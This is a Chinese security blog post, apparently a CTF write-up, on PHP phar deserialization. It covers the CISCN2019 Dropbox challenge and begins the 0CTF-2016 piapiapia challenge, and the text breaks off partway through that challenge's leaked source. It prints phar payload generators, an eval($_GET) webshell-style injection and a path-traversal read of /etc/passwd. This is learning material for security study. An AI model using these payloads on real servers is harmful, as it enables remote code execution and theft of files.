@@ -1,0 +1,1132 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Hexo, NexT">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="关于phar反序列化phar反序列化 简单的说，phar就是php的压缩文件，它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与file:// ，php://等类似，也是一种流包装器。phar结构由 4 部分组成: stub:phar 文件标识，格式为 xxx； manifest:压缩文件的属性等信息，以序列化存储； contents:压缩文件的内容； signatu">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Horizon&#39;s Security Notes">
+<meta property="og:url" content="https://Horizoncy.github.io/2019/12/25/反序列化/index.html">
+<meta property="og:site_name" content="Horizon&#39;s Security Notes">
+<meta property="og:description" content="关于phar反序列化phar反序列化 简单的说，phar就是php的压缩文件，它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与file:// ，php://等类似，也是一种流包装器。phar结构由 4 部分组成: stub:phar 文件标识，格式为 xxx； manifest:压缩文件的属性等信息，以序列化存储； contents:压缩文件的内容； signatu">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:updated_time" content="2019-11-15T02:27:06.651Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Horizon&#39;s Security Notes">
+<meta name="twitter:description" content="关于phar反序列化phar反序列化 简单的说，phar就是php的压缩文件，它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与file:// ，php://等类似，也是一种流包装器。phar结构由 4 部分组成: stub:phar 文件标识，格式为 xxx； manifest:压缩文件的属性等信息，以序列化存储； contents:压缩文件的内容； signatu">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://Horizoncy.github.io/2019/12/25/反序列化/">
+
+
+
+
+
+  <title> | Horizon's Security Notes</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Horizon's Security Notes</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">With great power comes great responsibility.</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://Horizoncy.github.io/2019/12/25/反序列化/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Horizon">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Horizon's Security Notes">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline"></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-12-25T17:40:49+08:00">
+                2019-12-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="关于phar反序列化"><a href="#关于phar反序列化" class="headerlink" title="关于phar反序列化"></a>关于phar反序列化</h1><h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><ul>
+<li>简单的说，phar就是php的压缩文件，它可以把多个文件归档到同一个文件中，而且不经过解压就能被 php 访问并执行，与file:// ，php://等类似，也是一种流包装器。<br>phar结构由 4 部分组成:</li>
+<li>stub:phar 文件标识，格式为 xxx<?php xxx; __HALT_COMPILER();?>；</li>
+<li>manifest:压缩文件的属性等信息，以序列化存储；</li>
+<li>contents:压缩文件的内容；</li>
+<li>signature:签名，放在文件末尾；<br>这里有两个关键点：</li>
+<li>一是文件标识，必须以__HALT_COMPILER();?&gt;结尾，但前面的内容没有限制，也就是说我们可以轻易伪造一个图片文件或者pdf文件来绕过一些上传限制；</li>
+<li>二是反序列化，phar存储的meta-data信息以序列化方式存储，当文件操作函数通过phar://伪协议解析phar文件时就会将数据反序列化，而这样的文件操作函数有很多。<br>受影响的文件函数:fileatime,filectime,file_exists,file_get_contents,file_put_contents,file,filegroup,fopen,fileinode,filemtime,fileowner,fileperms,is_dir,is_executable,is_file,is_link,is_readable,is_writable,is_writeable,parse_ini_file,copy,unlink,stat,readfile.<br>如果有文件test.php:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Testobj</span><br><span class="line">&#123;</span><br><span class="line">	var $output=&quot;echo &apos;ok&apos;;&quot;;</span><br><span class="line">	function __destruct()</span><br><span class="line">	&#123;</span><br><span class="line">		eval($this-&gt;output);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&apos;filename&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">	$filename=$_GET[&apos;filename&apos;];</span><br><span class="line">	var_dump(file_exists($filename));</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>生成phar的文件phar.phar可以这样写：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Testobj</span><br><span class="line">&#123;</span><br><span class="line">  var $output=&apos;&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(&apos;test.phar&apos;);   //删除之前的test.par文件(如果有)</span><br><span class="line">$phar=new Phar(&apos;test.phar&apos;);  //创建一个phar对象，文件名必须以phar为后缀</span><br><span class="line">$phar-&gt;startBuffering();  //开始写文件</span><br><span class="line">$phar-&gt;setStub(&apos;&lt;?php __HALT_COMPILER(); ?&gt;&apos;);  //写入stub</span><br><span class="line">$o=new Testobj();  </span><br><span class="line">$o-&gt;output=&apos;eval($_GET[&quot;a&quot;]);&apos;;  </span><br><span class="line">$phar-&gt;setMetadata($o);//写入meta-data</span><br><span class="line">$phar-&gt;addFromString(&quot;test.txt&quot;,&quot;test&quot;);  //添加要压缩的文件</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这样，当我们访问phar.phpr时，将会生成test.phar的phar文件。之后再将其作为参数传到test.php中，就可getshell.</p>
+<p>利用条件:</p>
+<ul>
+<li>phar文件要能够上传到服务器端.</li>
+<li>要有魔术方法作为跳板.</li>
+<li>要有文件操作函数，如file_exists()，fopen()，file_get_contents()，file().</li>
+<li>文件操作函数的参数可控，且:、/、phar等特<br>殊字符没有被过滤.<h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2></li>
+<li>进入题目随便注册一个账号，可以上传文件filename=<code>.htaccess.jpg</code>。上传了之后可以删除和下载文件。在下载文件的包中发现是通过post参数filename来进行的，所以尝试能不能进行任意文件下载。<br>修改filename可进行任意文件的下载(下载不了flag)。<code>filename=../../../../../etc/passwd</code>.</li>
+<li>于是下载网页源码，index.php，class.php，delete.php，ownload.php<br>注意到class.php中的Filelist类中的__destruct可以读取任意文件:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">public function __destruct() &#123;</span><br><span class="line">        $table = &apos;&lt;div id=&quot;container&quot; class=&quot;container&quot;&gt;&lt;div class=&quot;table-responsive&quot;&gt;&lt;table id=&quot;table&quot; class=&quot;table table-bordered table-hover sm-font&quot;&gt;&apos;;</span><br><span class="line">        $table .= &apos;&lt;thead&gt;&lt;tr&gt;&apos;;</span><br><span class="line">        foreach ($this-&gt;funcs as $func) &#123;</span><br><span class="line">            $table .= &apos;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;&apos; . htmlentities($func) . &apos;&lt;/th&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">        $table .= &apos;&lt;th scope=&quot;col&quot; class=&quot;text-center&quot;&gt;Opt&lt;/th&gt;&apos;;</span><br><span class="line">        $table .= &apos;&lt;/thead&gt;&lt;tbody&gt;&apos;;</span><br><span class="line">        foreach ($this-&gt;results as $filename =&gt; $result) &#123;</span><br><span class="line">            $table .= &apos;&lt;tr&gt;&apos;;</span><br><span class="line">            foreach ($result as $func =&gt; $value) &#123;</span><br><span class="line">                $table .= &apos;&lt;td class=&quot;text-center&quot;&gt;&apos; . htmlentities($value) . &apos;&lt;/td&gt;&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">            $table .= &apos;&lt;td class=&quot;text-center&quot; filename=&quot;&apos; . htmlentities($filename) . &apos;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;download&quot;&gt;下载&lt;/a&gt; / &lt;a href=&quot;#&quot; class=&quot;delete&quot;&gt;删除&lt;/a&gt;&lt;/td&gt;&apos;;</span><br><span class="line">            $table .= &apos;&lt;/tr&gt;&apos;;</span><br><span class="line">        &#125;</span><br><span class="line">        echo $table;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>class.php中的delete函数使用了unlink函数:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public function detele() &#123;</span><br><span class="line">       unlink($this-&gt;filename);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
+
+<p>而delete.php中又调用了delete函数:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">include &quot;class.php&quot;;</span><br><span class="line"></span><br><span class="line">chdir($_SESSION[&apos;sandbox&apos;]);</span><br><span class="line">$file = new File();</span><br><span class="line">$filename = (string) $_POST[&apos;filename&apos;];</span><br><span class="line">if (strlen($filename) &lt; 40 &amp;&amp; $file-&gt;open($filename)) &#123;</span><br><span class="line">    $file-&gt;detele();</span><br><span class="line">    Header(&quot;Content-type: application/json&quot;);</span><br><span class="line">    $response = array(&quot;success&quot; =&gt; true, &quot;error&quot; =&gt; &quot;&quot;);</span><br><span class="line">    echo json_encode($response);</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    Header(&quot;Content-type: application/json&quot;);</span><br><span class="line">    $response = array(&quot;success&quot; =&gt; false, &quot;error&quot; =&gt; &quot;File not exist&quot;);</span><br><span class="line">    echo json_encode($response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>生成phar文件的php代码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class User &#123;</span><br><span class="line">        public $db;</span><br><span class="line">    &#125; </span><br><span class="line">    class File&#123;</span><br><span class="line">        public $filename;</span><br><span class="line">        public function __construct($name)&#123;</span><br><span class="line">            $this-&gt;filename=$name;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    class FileList &#123;</span><br><span class="line">        private $files;</span><br><span class="line">        public function __construct()&#123;</span><br><span class="line">            $this-&gt;files=array(new File(&apos;/flag.txt&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    $o = new User();</span><br><span class="line">    $o-&gt;db =new FileList();</span><br><span class="line">    @unlink(&quot;phar.phar&quot;);</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;);</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);</span><br><span class="line">    $phar-&gt;setMetadata($o);</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); </span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>之后将生成的phar文件后缀改为jpg上传。<br>接下来再点击删除文件，将文件名改为phar://phar.jpg即可获得flag.</p>
+<h1 id="0CTF-2016-piapiapia-php反序列化长度变化尾部字符串逃逸"><a href="#0CTF-2016-piapiapia-php反序列化长度变化尾部字符串逃逸" class="headerlink" title="0CTF-2016-piapiapia(php反序列化长度变化尾部字符串逃逸)"></a>0CTF-2016-piapiapia(php反序列化长度变化尾部字符串逃逸)</h1><ul>
+<li>进行一下目录扫描，发现源码泄露<a href="http://www.zip，把源码给出：" target="_blank" rel="noopener">www.zip，把源码给出：</a><br>index.php:<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&apos;class.php&apos;);</span><br><span class="line">	if($_SESSION[&apos;username&apos;]) &#123;</span><br><span class="line">		header(&apos;Location: profile.php&apos;);</span><br><span class="line">		exit;</span><br><span class="line">	&#125;</span><br><span class="line">	if($_POST[&apos;username&apos;] &amp;&amp; $_POST[&apos;password&apos;]) &#123;</span><br><span class="line">		$username = $_POST[&apos;username&apos;];</span><br><span class="line">		$password = $_POST[&apos;password&apos;];</span><br><span class="line"></span><br><span class="line">		if(strlen($username) &lt; 3 or strlen($username) &gt; 16) </span><br><span class="line">			die(&apos;Invalid user name&apos;);</span><br><span class="line"></span><br><span class="line">		if(strlen($password) &lt; 3 or strlen($password) &gt; 16) </span><br><span class="line">			die(&apos;Invalid password&apos;);</span><br><span class="line"></span><br><span class="line">		if($user-&gt;login($username, $password)) &#123;</span><br><span class="line">			$_SESSION[&apos;username&apos;] = $username;</span><br><span class="line">			header(&apos;Location: profile.php&apos;);</span><br><span class="line">			exit;	</span><br><span class="line">		&#125;</span><br><span class="line">		else &#123;</span><br><span class="line">			die(&apos;Invalid user name or password&apos;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">		&lt;form action=&quot;index.php&quot; method=&quot;post&quot; class=&quot;well&quot; style=&quot;width:220px;margin:0px auto;&quot;&gt; </span><br><span class="line">			&lt;img src=&quot;static/piapiapia.gif&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">			&lt;h3&gt;Login&lt;/h3&gt;</span><br><span class="line">			&lt;label&gt;Username:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;height:30px&quot;class=&quot;span3&quot;/&gt;</span><br><span class="line">			&lt;label&gt;Password:&lt;/label&gt;</span><br><span class="line">			&lt;input type=&quot;password&quot; name=&quot;password&quot; style=&quot;height:30px&quot; class=&quot;span3&quot;&gt;</span><br><span class="line"></span><br><span class="line">			&lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;LOGIN&lt;/button&gt;</span><br><span class="line">		&lt;/form&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+<p>在输入账号密码之后进入了profile.php，下面是profile.php的源码：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&apos;class.php&apos;);</span><br><span class="line">	if($_SESSION[&apos;username&apos;] == null) &#123;</span><br><span class="line">		die(&apos;Login First&apos;);	</span><br><span class="line">	&#125;</span><br><span class="line">	$username = $_SESSION[&apos;username&apos;];</span><br><span class="line">	$profile=$user-&gt;show_profile($username);</span><br><span class="line">	if($profile  == null) &#123;</span><br><span class="line">		header(&apos;Location: update.php&apos;);</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">		$profile = unserialize($profile);</span><br><span class="line">		$phone = $profile[&apos;phone&apos;];</span><br><span class="line">		$email = $profile[&apos;email&apos;];</span><br><span class="line">		$nickname = $profile[&apos;nickname&apos;];</span><br><span class="line">		$photo = base64_encode(file_get_contents($profile[&apos;photo&apos;]));</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Profile&lt;/title&gt;</span><br><span class="line">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script src=&quot;static/bootstrap.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">	&lt;div class=&quot;container&quot; style=&quot;margin-top:100px&quot;&gt;  </span><br><span class="line">		&lt;img src=&quot;data:image/gif;base64,&lt;?php echo $photo; ?&gt;&quot; class=&quot;img-memeda &quot; style=&quot;width:180px;margin:0px auto;&quot;&gt;</span><br><span class="line">		&lt;h3&gt;Hi &lt;?php echo $nickname;?&gt;&lt;/h3&gt;</span><br><span class="line">		&lt;label&gt;Phone: &lt;?php echo $phone;?&gt;&lt;/label&gt;</span><br><span class="line">		&lt;label&gt;Email: &lt;?php echo $email;?&gt;&lt;/label&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line">&lt;?php</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>还有注册页面的源码(没有太大用)，register.php：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(&apos;class.php&apos;);</span><br><span class="line">	if($_POST[&apos;username&apos;] &amp;&amp; $_POST[&apos;password&apos;]) &#123;</span><br><span class="line">		$username = $_POST[&apos;username&apos;];</span><br><span class="line">		$password = $_POST[&apos;password&apos;];</span><br><span class="line"></span><br><span class="line">		if(strlen($username) &lt; 3 or strlen($username) &gt; 16) </span><br><span class="line">			die(&apos;Invalid user name&apos;);</span><br><span class="line"></span><br><span class="line">		if(strlen($password) &lt; 3 or strlen($password) &gt; 16) </span><br><span class="line">			die(&apos;Invalid password&apos;);</span><br><span class="line">		if(!$user-&gt;is_exists($username)) &#123;</span><br><span class="line">			$user-&gt;register($username, $password);</span><br><span class="line">			echo &apos;Register OK!&lt;a href=&quot;index.php&quot;&gt;Please Login&lt;/a&gt;&apos;;		</span><br><span class="line">		&#125;</span><br><span class="line">		else &#123;</span><br><span class="line">			die(&apos;User name Already Exists&apos;);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	else &#123;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">   &lt;title&gt;Login&lt;/title&gt;</span><br><span class="line">   &lt;link href=&quot;static/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;</span><br><span class="line">   &lt;script src=&quot;static/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">   &lt;script 